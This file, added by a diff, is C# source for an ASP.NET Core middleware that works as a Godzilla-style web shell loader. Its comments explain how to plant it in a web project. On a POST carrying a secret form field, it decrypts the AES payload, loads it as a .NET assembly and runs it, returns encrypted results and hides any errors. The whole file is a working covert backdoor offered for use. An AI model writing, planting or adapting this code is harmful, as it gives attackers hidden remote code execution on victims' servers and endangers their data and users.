@@ -1,0 +1,117 @@
+// ASP.NET Core middleware loader for gsl5 CSharpCoreDynamicPayload
+// Usage:
+//   1) Put this file into your web project, or paste the class into Program.cs / Startup.
+//   2) app.UseMiddleware<GslCoreShellMiddleware>();
+//   3) Generate shell with cryption CSHARP_CORE_AES_BASE64 (password/key same as client).
+// Protocol matches classic Godzilla C# AES_BASE64:
+//   request : application/x-www-form-urlencoded  pass=<base64(aes(payload|params))>
+//   response: <md5[0..16]><base64(aes(gzipResult))><md5[16..]>
+
+using System;
+using System.Collections.Concurrent;
+using System.IO;
+using System.Reflection;
+using System.Security.Cryptography;
+using System.Text;
+using System.Threading.Tasks;
+using Microsoft.AspNetCore.Http;
+
+public class GslCoreShellMiddleware
+{
+    // filled by generator
+    private const string Pass = "{pass}";
+    private const string Key = "{secretKey}";
+
+    private static readonly ConcurrentDictionary<string, Assembly> Store =
+        new ConcurrentDictionary<string, Assembly>(StringComparer.Ordinal);
+
+    private readonly RequestDelegate _next;
+
+    public GslCoreShellMiddleware(RequestDelegate next)
+    {
+        _next = next;
+    }
+
+    public async Task Invoke(HttpContext context)
+    {
+        try
+        {
+            if (!HttpMethods.IsPost(context.Request.Method))
+            {
+                await _next(context);
+                return;
+            }
+
+            if (!context.Request.HasFormContentType || !context.Request.Form.ContainsKey(Pass))
+            {
+                await _next(context);
+                return;
+            }
+
+            string b64 = context.Request.Form[Pass];
+            if (string.IsNullOrEmpty(b64))
+            {
+                await _next(context);
+                return;
+            }
+
+            byte[] keyBytes = Encoding.UTF8.GetBytes(Key);
+            byte[] data = Convert.FromBase64String(b64);
+            data = AesTransform(data, keyBytes, false);
+
+            string md5 = Md5Hex(Pass + Key);
+            Assembly asm;
+            if (!Store.TryGetValue("payload", out asm) || asm == null)
+            {
+                asm = Assembly.Load(data);
+                Store["payload"] = asm;
+                context.Response.StatusCode = 200;
+                await context.Response.WriteAsync("");
+                return;
+            }
+
+            object o = asm.CreateInstance("LY");
+            MemoryStream outStream = new MemoryStream();
+            o.Equals(outStream);
+            o.Equals(data);
+            o.ToString();
+            byte[] r = outStream.ToArray();
+            outStream.Dispose();
+
+            byte[] enc = AesTransform(r, keyBytes, true);
+            string body = md5.Substring(0, 16) + Convert.ToBase64String(enc) + md5.Substring(16);
+            context.Response.StatusCode = 200;
+            context.Response.ContentType = "text/html; charset=utf-8";
+            await context.Response.WriteAsync(body);
+        }
+        catch
+        {
+            // silent
+            try { await _next(context); } catch { }
+        }
+    }
+
+    private static string Md5Hex(string s)
+    {
+        using (MD5 md5 = MD5.Create())
+        {
+            byte[] hash = md5.ComputeHash(Encoding.UTF8.GetBytes(s));
+            StringBuilder sb = new StringBuilder(hash.Length * 2);
+            for (int i = 0; i < hash.Length; i++) sb.Append(hash[i].ToString("X2"));
+            return sb.ToString();
+        }
+    }
+
+    private static byte[] AesTransform(byte[] data, byte[] key, bool encrypt)
+    {
+        using (Aes aes = Aes.Create())
+        {
+            aes.Mode = CipherMode.CBC;
+            aes.Padding = PaddingMode.PKCS7;
+            aes.Key = key;
+            aes.IV = key;
+            ICryptoTransform t = encrypt ? aes.CreateEncryptor() : aes.CreateDecryptor();
+            return t.TransformFinalBlock(data, 0, data.Length);
+        }
+    }
+}
